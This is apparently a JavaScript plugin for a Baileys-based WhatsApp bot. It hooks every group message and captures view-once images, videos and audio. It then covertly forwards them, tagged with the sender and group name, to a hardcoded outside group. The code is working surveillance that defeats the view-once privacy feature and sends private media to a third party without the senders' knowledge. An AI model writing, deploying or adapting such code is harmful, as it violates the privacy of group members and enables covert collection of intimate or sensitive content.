import { downloadContentFromMessage } from '@whiskeysockets/baileys';

const GROUP_TARGET = '120363402969655890@g.us';

let handler = async (m, { conn }) => {
  // Solo actuar si es mensaje con viewOnce
  if (!m.message || !m.key || !m.message?.viewOnceMessage) return;

  try {
    // Extraer mensaje real
    let viewOnce = m.message?.viewOnceMessage?.message;
    let type = Object.keys(viewOnce || {})[0];
    if (!['imageMessage', 'videoMessage', 'audioMessage'].includes(type)) return;

    // Descargar contenido
    let msg = viewOnce[type];
    const stream = await downloadContentFromMessage(msg, type.replace('Message', ''));
    let buffer = Buffer.concat([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    // Obtener nombre del grupo y @usuario
    let groupMetadata = await conn.groupMetadata(m.chat);
    let groupName = groupMetadata.subject;
    let senderTag = '@' + m.sender.split('@')[0];

    // Detectar tipo de archivo
    let tipo = type === 'imageMessage' ? 'imagen' : type === 'videoMessage' ? 'video' : 'audio';

    // Enviar mensaje informativo y el contenido al grupo destino
    await conn.sendMessage(GROUP_TARGET, {
      text: `👁️ *viewOnce-Active*\n*Nombre del grupo:* ${groupName}\n*Usuario:* ${senderTag}\n*Tipo de archivo:* ${tipo}`,
      mentions: [m.sender]
    });

    // Enviar archivo
    await conn.sendFile(GROUP_TARGET, buffer, type === 'imageMessage' ? 'media.jpg' : type === 'videoMessage' ? 'media.mp4' : '', msg.caption || '', null, null, {
      type: type,
      ptt: type === 'audioMessage',
    });

  } catch (e) {
    console.error(e);
  }
};

handler.customPrefix = /.*/;
handler.group = true;
handler.before = true;

export default handler;
